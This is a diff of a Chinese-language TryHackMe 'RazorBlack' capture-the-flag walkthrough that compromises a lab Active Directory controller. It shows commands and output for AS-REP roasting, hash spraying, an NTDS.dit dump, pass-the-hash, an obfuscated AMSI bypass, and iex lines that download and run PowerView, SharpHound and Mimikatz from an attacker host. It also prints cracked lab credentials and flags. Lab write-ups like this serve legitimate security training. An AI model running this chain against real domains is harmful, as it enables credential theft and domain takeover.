@@ -1,9 +1,13 @@
+# 免责声明
+>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。
+
+
 # 服务探测
 ```
 ┌──(root💀kali)-[~/tryhackme/RazorBlack]
-└─# nmap -sV -Pn 10.10.132.124          
+└─# nmap -sV -Pn 10.10.246.107          
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-02 01:48 EST
-Nmap scan report for 10.10.132.124 
+Nmap scan report for 10.10.246.107 
 Host is up (0.23s latency).
 Not shown: 986 closed tcp ports (reset)
 PORT     STATE SERVICE       VERSION
@@ -28,23 +32,23 @@ Nmap done: 1 IP address (1 host up) scanned in 252.05 seconds
 
 ```
 
-
+# 枚举
 enum4linux,域名应该是RAZ0RBLACK.thm
 ```
 Domain Name: RAZ0RBLACK
 Domain Sid: S-1-5-21-3403444377-2687699443-13012745
 ```
 
-枚举分项目录
+枚举分享目录
 ```
-└─# showmount -e 10.10.132.124 
-Export list for 10.10.132.124 :
+└─# showmount -e 10.10.246.107 
+Export list for 10.10.246.107 :
 /users (everyone)
 ```
 
 把远程目录mount到本地
 ```
-mount -t nfs  10.10.132.124 :/users /mnt/share -o nolock
+mount -t nfs  10.10.246.107 :/users /mnt/share -o nolock
 ```
 
 有两个文件
@@ -103,10 +107,10 @@ sbradley
 clin
 ```
 
-枚举关闭了预认证的用户
+枚举关闭了Kerberos预认证的用户
 ```
 ┌──(root💀kali)-[~/tryhackme/RazorBlack]
-└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py raz0rblack.thm/ -usersfile /root/tryhackme/RazorBlack/user.txt   -dc-ip 10.10.132.124 
+└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py raz0rblack.thm/ -usersfile /root/tryhackme/RazorBlack/user.txt   -dc-ip 10.10.246.107 
 Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
 
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
@@ -150,8 +154,8 @@ twilliams ： roastpotatoes
 枚举smb
 ```
 ┌──(root💀kali)-[~/tryhackme/RazorBlack]
-└─# smbmap -u "twilliams" -p "roastpotatoes" -H 10.10.132.124 
-[+] IP: 10.10.132.124 :445        Name: raz0rblack.thm                                    
+└─# smbmap -u "twilliams" -p "roastpotatoes" -H 10.10.246.107 
+[+] IP: 10.10.246.107 :445        Name: raz0rblack.thm                                    
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
@@ -166,20 +170,21 @@ twilliams ： roastpotatoes
 
 ## spray the hash
 
+用同样的密码对上面收集到的用户名做哈希喷洒
 ```
 ┌──(root💀kali)-[~/tryhackme/RazorBlack]
-└─# crackmapexec smb 10.10.132.124 -u user.txt -p pass.txt      
-SMB         10.10.132.124    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
-SMB         10.10.132.124    445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE 
-SMB         10.10.132.124    445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE 
-SMB         10.10.132.124    445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE 
-SMB         10.10.132.124    445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE 
-SMB         10.10.132.124    445    HAVEN-DC         [-] raz0rblack.thm\cingram:roastpotatoes STATUS_LOGON_FAILURE 
-SMB         10.10.132.124    445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE 
-SMB         10.10.132.124    445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE 
-SMB         10.10.132.124    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
-SMB         10.10.132.124    445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE 
-SMB         10.10.132.124    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
+└─# crackmapexec smb 10.10.246.107 -u user.txt -p pass.txt      
+SMB         10.10.246.107    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
+SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\cingram:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
 ```
 看到下面这组用户凭据提示要修改密码
 ```
@@ -189,7 +194,7 @@ sbradley:roastpotatoes
 用smbpasswd.py修改一个新密码
 ```
 ┌──(root💀kali)-[~/tryhackme/RazorBlack]
-└─# python3 /root/impacket/examples/smbpasswd.py  RAZ0RBLACK.THM/sbradley:roastpotatoes@10.10.132.124 -newpass 'newpassword123'                                                                                                   1 ⨯
+└─# python3 /root/impacket/examples/smbpasswd.py  RAZ0RBLACK.THM/sbradley:roastpotatoes@10.10.246.107 -newpass 'newpassword123'                                                                                                   1 ⨯
 Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
 
 [!] Password is expired, trying to bind with a null session.
@@ -201,8 +206,8 @@ Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corpo
 
 ```
 ┌──(root💀kali)-[~/tryhackme/RazorBlack]
-└─# smbmap -u "sbradley" -p "newpassword123" -H 10.10.132.124 
-[+] IP: 10.10.132.124 :445        Name: 10.10.132.124                                      
+└─# smbmap -u "sbradley" -p "newpassword123" -H 10.10.246.107 
+[+] IP: 10.10.246.107 :445        Name: 10.10.246.107                                      
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
@@ -218,7 +223,7 @@ Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corpo
 查看分享文件
 ```
 ┌──(root💀kali)-[~/tryhackme/RazorBlack]
-└─# smbclient -U 'sbradley%newpassword123' \\\\10.10.132.124 \\trash
+└─# smbclient -U 'sbradley%newpassword123' \\\\10.10.246.107 \\trash
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Tue Mar 16 02:01:28 2021
@@ -278,7 +283,7 @@ Session completed.
 
 ```
 
-破解zip文件的密码为：electromagnetismo
+破解zip文件的密码为：```electromagnetismo```
 
 查看文件
 ```
@@ -289,6 +294,7 @@ ntds.dit  system.hive
 
 > Ntds.dit文件是域环境中域控上会有的一个二进制文件，是主要的活动目录数据库，其文件路径为域控的%SystemRoot%\ntds\ntds.dit，活动目录始终会访问这个文件，所以文件禁止被读取
 
+说白了就算AD里的数据库
 
 用secretsdump.py把Ntds.dit里的数据导出，注意这里的数据很多，需要重定向到一个新文件user.hash 
 ```
@@ -323,20 +329,20 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:703a365974d7c3eeb80e11dd27fb0cb3:::
 <skip>
 ```
 
-然后再通过下面命令进行密码喷洒
+然后再通过下面命令进行哈希喷洒
 ```
-crackmapexec smb 10.10.132.124  -u /root/tryhackme/RazorBlack/user.txt -H user.hash 
+crackmapexec smb 10.10.246.107  -u /root/tryhackme/RazorBlack/user.txt -H user.hash 
 ```
 
 得到一组有效的哈希：
 ```
 lvetrova:f220d3988deb3f516c73f40ee16c431d
 ```
-
+## pass the hash
 使用evil-winrm登录，拿到foodhold
 ```
 ┌──(root💀kali)-[~/tryhackme/RazorBlack]
-└─# evil-winrm -i 10.10.132.124  -u lvetrova -H f220d3988deb3f516c73f40ee16c431d                                                                                                                                                         1 ⨯
+└─# evil-winrm -i 10.10.246.107  -u lvetrova -H f220d3988deb3f516c73f40ee16c431d                                                                                                                                                         1 ⨯
 
 Evil-WinRM shell v3.2
 
@@ -359,7 +365,7 @@ raz0rblack\lvetrova
 THM{694362e877adef0d85a92e6d17551fe4}
 ```
 
-
+# 权限提升
 绕过powershell执行策略
 ```
 $env:PSExecutionPolicyPreference="bypass"
@@ -375,8 +381,6 @@ S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F
 iex (iwr http://10.11.63.196/PowerView.ps1 -UseBasicParsing)
 
 iex (iwr http://10.11.63.196/SharpHound.ps1 -UseBasicParsing)
-
-iex (iwr http://10.11.63.196/PowerUp.ps1 -UseBasicParsing)
 
 iex (iwr http://10.11.63.196/Invoke-Mimikatz.ps1  -UseBasicParsing)
 ```
@@ -425,7 +429,13 @@ Session completed
 ```
 
 
-得到xyan1d3的明文密码：cyanide9amine5628
+得到xyan1d3的明文密码：```cyanide9amine5628```
+
+
+登录：
+```
+evil-winrm -i 10.10.246.107  -u xyan1d3 -p cyanide9amine5628
+```
 
 
 使用下面两行代码拿到第二个用户flag
@@ -506,62 +516,159 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 可以在任何路径写入dll文件进行dll劫持
 
-使用github上这个脚本
-```https://github.com/giuliano108/SeBackupPrivilege```
+因为dll劫持还需要有重启系统服务的能力，我们重点关注SeBackupPrivilege的利用
+
+我搜索了一下利用方法，找到了[这篇文章](https://www.ultimatewindowssecurity.com/blog/default.aspx?p=c2bacbe0-d4fc-4876-b6a3-1995d653f32a)
 
 
+导出sam和system文件到本地
+```
+reg save HKLM\SAM sambkup.hiv
 
-copy-filesebackupprivilege c:\windows\ntds\ntds.dit C:\temp\ntds.dit -overwrite
+reg save HKLM\SYSTEM systembkup.hiv
+```
 
-C:\Windows\System32\config
+使用mimikatz导出NTML哈希（注意每次登陆都要bypass powershell policy 和AMSI）
+```
+Evil-WinRM* PS C:\Users\xyan1d3\Documents> Invoke-Mimikatz -Command '"lsadump::sam /sam:sambkup.hiv /system:systembkup.hiv"'
 
-Acl-FullControl -user raz0rblack\xyan1d3 -path C:\Windows\System32\config
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # lsadump::sam /sam:sambkup.hiv /system:systembkup.hiv
+Domain : HAVEN-DC
+SysKey : f1582a79dd00631b701d3d15e75e59f6
+Local SID : S-1-5-21-1320649623-3804182013-2902712059
+
+SAMKey : eaa05099b2f12f633fca797270e3e4fa
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 9689931bed40ca5a2ce1218210177f0c
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+
+```
+
+使用哈希传递登录administrator的账号
+```
+──(root💀kali)-[~/tryhackme/RazorBlack]
+└─# evil-winrm -i 10.10.246.107  -u Administrator -H 9689931bed40ca5a2ce1218210177f0c
+
+Evil-WinRM shell v3.2
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+raz0rblack\administrator
+
+```
+已拿到系统管理员权限
+
+读取root.xml
+```
+*Evil-WinRM* PS C:\Users\Administrator> cat root.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">Administrator</S>
+      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
+  </Obj>
+</Objs>
+
+```
+
+在hackbar上用hexdecode为
+```
+Damn you are a genius.
+But, I apologize for cheating you like this.
+
+Here is your Root Flag
+THM{1b4f46cc4fba46348273d18dc91da20d}
+
+Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.
+
+If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
+Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.
+
+```
+
+另一个cookie.json的内容
+```
+*Evil-WinRM* PS C:\Users\Administrator> cat cookie.json
+{
+        auth : "TG9vayB0aGlzIGlzIHlvdXIgY29va2llLgpGdW5GYWN0IDogVGhpcyBjb29raWUgY2FuIGNoYW5nZSBpdHMgb3duIGZsYXZvdXIgYXV0b21hdGljYWxseS4gVG8gdGVzdCBpdCBqdXN0IHRoaW5rIG9mIHlvdXIgZmF2b3VyaXRlIGZsYXZvdXIuCgpBbmQgc3RvcCBwdXR0aW5nICdPUiAnMSc9JzEgaW5zaWRlIGxvZ2luLnBocAoKRW5qb3kgeW91ciBDb29raWU="
+}
+```
+
+base64decode后：
+```
+Look this is your cookie.
+FunFact : This cookie can change its own flavour automatically. To test it just think of your favourite flavour.
+
+And stop putting 'OR '1'='1 inside login.php
+
+Enjoy your Cookie
+```
+
+去到另一个用户文件夹
+```
+*Evil-WinRM* PS C:\Users\twilliams> ls
 
 
+    Directory: C:\Users\twilliams
 
 
-Invoke-Mimikatz -Command '"lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv"'
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/25/2021  10:18 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
+                                                 finitely_definitely_not_a_flag.exe
+
+```
+
+有一个名字超长的exe文件，尝试执行，但是失败了
+
+直接读取
+```
+*Evil-WinRM* PS C:\Users\twilliams> cat definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
+THM{5144f2c4107b7cab04916724e3749fb0}
+```
 
 
-Acl-FullControl -user raz0rblack\xyan1d3 -path c:\users\Administrator
+> What is the complete top secret?
+
+把这张图片下载到本地
+```C:\Program Files\Top Secret\top_secret.png```
+
+答案是：```:wq```
 
 
-
-
-
-*Evil-WinRM* PS C:\Users\xyan1d3> $Credential = Import-Clixml -Path "root.xml"
-*Evil-WinRM* PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
-LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
-
-
-evil-winrm -i 10.10.132.124 -u xyan1d3 -p cyanide9amine5628
-
-
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.63.196/winPEAS.bat','C:\Users\lvetrova\desktop\winPEAS.bat')"
-
-
-
-
-
-crackmapexec smb 10.10.132.124 -u /root/tryhackme/RazorBlack/user.txt -H user.hash 
-
-evil-winrm -i 10.10.132.124 -u krbtgt -H 703a365974d7c3eeb80e11dd27fb0cb3
-
-evil-winrm -i 10.10.132.124 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d 
-
-
-smbmap -u "sbradley" -p "newpassword123" -H 10.10.132.124 
-
-evil-winrm -i 10.10.132.124 -u 'Administrator' -p 'roastpotatoes'
-
-crackmapexec smb 10.10.132.124 -u 'twilliams' -p 'roastpotatoes' --shares
-
-smbclient -U 'sbradley%newpassword123' \\\\10.10.132.124 \\trash
-
-
-crackmapexec smb 10.10.132.124 -u user.txt -p pass.txt
-
-
-hydra -L user.txt -p 'roastpotatoes' 10.10.132.124 smb -I -V
-
-python3 /root/impacket-master/examples/smbpasswd.py  RAZ0RBLACK.THM/sbradley:roastpotatoes@10.10.132.124 -newpass 'newpassword123'
